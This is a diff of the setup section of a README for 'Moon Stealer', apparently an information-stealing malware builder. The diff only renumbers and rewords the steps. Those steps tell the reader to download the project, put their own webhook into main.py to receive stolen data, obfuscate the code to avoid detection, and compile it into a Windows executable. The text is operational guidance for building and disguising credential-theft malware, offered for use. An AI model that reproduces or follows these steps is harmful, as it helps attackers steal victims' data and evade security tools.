@@ -25,21 +25,21 @@
 ### Setup
 
 ```sh-session
-Download Moon Stealer (https://github.com/Yuvi5001/moon-stealer/archive/refs/heads/main.zip)
+1. Download moon stealer (https://codeload.github.com/Yuvi5001/moon-stealer/zip/refs/heads/main)
 
-Extract File
+2. Extract zip file
 
-Tap "install_python.bat" in Moon Folder if you dont got Python
+3. Tap "Install_python.bat" in moon folder if you do not have python
 
-Open `main.py` with any text editor such as notepad
+4. Open `main.py` with any text editor such as notepad
 
-Replace the webhook in line 16
+5. Replace the webhook in line 16
 
-Obfuscate your code: [https://pyobfuscate.com/](https://pyobfuscate.com/pyd) (Recommended)
+6. Obfuscate your code: [https://pyobfuscate.com/](https://pyobfuscate.Com/pyd) (recommended)
 
-Run `Convert-To-Exe.py` to convert it to a .exe file type.
-
-check ur dist folder for your executable
+7. Run `convert-to-exe.py` to convert it to a .exe file type. (buggy)
+ 
+8. Check ur dist folder for your executable
 
 Enjoy!
 
